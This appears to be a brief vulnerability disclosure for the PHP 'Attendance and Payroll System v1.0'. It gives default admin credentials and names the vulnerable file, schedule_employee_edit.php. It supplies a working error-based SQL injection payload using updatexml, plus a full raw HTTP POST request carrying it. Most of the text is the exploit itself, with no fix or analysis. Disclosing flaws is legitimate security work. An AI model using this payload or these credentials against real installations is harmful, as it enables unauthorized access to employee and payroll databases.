# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\schedule_employee_edit.php has SQL injection

Payload: id=7' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159257629-4514514a-66fb-4120-9106-b12c569c956a.png)

```sql
POST /apsystem/admin/schedule_employee_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/schedule_employee.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=11' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&schedule=2&edit=
```
![image](https://user-images.githubusercontent.com/54017627/159257769-2911921d-1f0e-4977-8945-fb378da323a5.png)

![image](https://user-images.githubusercontent.com/54017627/159257563-525ea750-9116-4c42-a43d-e47c9a50bebd.png)
